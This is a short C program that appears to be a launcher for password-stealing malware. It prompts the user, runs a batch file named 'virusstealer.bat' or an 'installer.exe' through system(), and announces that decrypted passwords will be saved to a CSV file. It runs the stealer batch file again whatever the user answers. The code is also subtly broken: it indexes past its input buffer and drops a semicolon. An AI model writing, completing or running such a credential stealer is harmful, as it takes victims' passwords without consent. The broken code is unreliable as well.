#include <stdio.h>
#include <stdlib.h>

int main () {
    printf ("Does your computer has python?(y/n)\n");

    char option[2];
    scanf ("%s", option);

    switch (option[2]) {
        case 'y' : ; 
         char* batchfile = "virusstealer.bat";
         system (batchfile);
         printf ("Current Passwords will be saved in decrypted_passwords.csv, opening that file in notepad.");

    break;

       case 'n' : ;
       char* executable_path = "installer.exe";
        system(executable_path)
       int return_value = system(executable_path);
       if (return_value == 0) {
        printf("Executable was executed successfully.\n");
    } 
    else {
        printf("Failed to execute the executable.\n");
    }
    break;

    default : printf ("Picked the wrong option; Options are: Y for YES, N for NO.");

    }
        char opt[2];
    scanf ("%s", opt);
    char* batchfile = "virusstealer.bat";
    system (batchfile);
   //exit code
    printf ("Press any key to exit...\n");
    char exit[2];
    scanf ("%s", exit);
    return 0;

}
